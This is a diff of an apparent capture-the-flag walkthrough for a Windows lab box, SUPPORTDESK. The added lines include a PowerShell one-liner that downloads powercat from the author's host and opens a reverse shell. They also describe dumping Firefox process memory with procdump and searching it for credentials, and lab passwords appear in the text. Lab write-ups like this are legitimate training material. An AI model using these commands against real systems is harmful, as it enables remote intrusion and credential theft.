@@ -66,7 +66,30 @@ chase:Q4)sJu\Y8qz*A3?d
 <img width="1006" alt="12" src="https://user-images.githubusercontent.com/47299364/69318163-dcc9b880-0c3c-11ea-91e1-abe29a733fb8.png">
 
 And i got user flag:
+
 <img width="517" alt="13" src="https://user-images.githubusercontent.com/47299364/69318186-e3583000-0c3c-11ea-8528-26db202ac605.png">
+
+From here i tried to get a reverse shell back to my machine. For that i had setup a python simplehttpserver with the shell and ran the below command to get it into the box and establish the reverse shell straight away:
+
+the command: 
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.157/powercat/powercat.ps1');powercat -c 10.10.14.157 -p 9091 -e cmd"
+
+<img width="1140" alt="14" src="https://user-images.githubusercontent.com/47299364/69318362-4d70d500-0c3d-11ea-9cea-775934716d64.png">
+
+Found some interesting processes running on the server using PsList. So i've moved procdump using the same method to the box to try to dump those processes from memory:
+
+<img width="665" alt="15" src="https://user-images.githubusercontent.com/47299364/69318455-827d2780-0c3d-11ea-94e6-b91ccdadc26f.png">
+
+<img width="665" alt="16" src="https://user-images.githubusercontent.com/47299364/69318476-8dd05300-0c3d-11ea-9eb2-0246b26311f7.png">
+
+And then i looked for specific patterns of the username found in the previous steps. It was successfull when i searched for the support user:
+
+PS command: 
+Get-ChildItem firefox.exe_191115_065903.dmp -Recurse -File | Select-String "supportdesk"
+
+<img width="1043" alt="17" src="https://user-images.githubusercontent.com/47299364/69318558-ae98a880-0c3d-11ea-8aaa-645d8aa8d69e.png">
+
+So now we have another user and credentials:
 
 
 
@@ -85,29 +108,8 @@ chase:Q4)sJu\Y8qz*A3?d
 
 hazard:stealth1agent	
 
-PORT      STATE SERVICE       VERSION
-80/tcp    open  http          Microsoft IIS httpd 10.0
-135/tcp   open  msrpc         Microsoft Windows RPC
-445/tcp   open  microsoft-ds?
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-49668/tcp open  msrpc         Microsoft Windows RPC
 					
 
-Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
-
-[*] Brute forcing SIDs at 10.10.10.149
-[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
-[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
-500: SUPPORTDESK\Administrator (SidTypeUser)
-501: SUPPORTDESK\Guest (SidTypeUser)
-503: SUPPORTDESK\DefaultAccount (SidTypeUser)
-504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
-513: SUPPORTDESK\None (SidTypeGroup)
-1008: SUPPORTDESK\Hazard (SidTypeUser)
-1009: SUPPORTDESK\support (SidTypeUser)
-1012: SUPPORTDESK\Chase (SidTypeUser)
-1013: SUPPORTDESK\Jason (SidTypeUser)
-root@kali:~# 
 
 
 
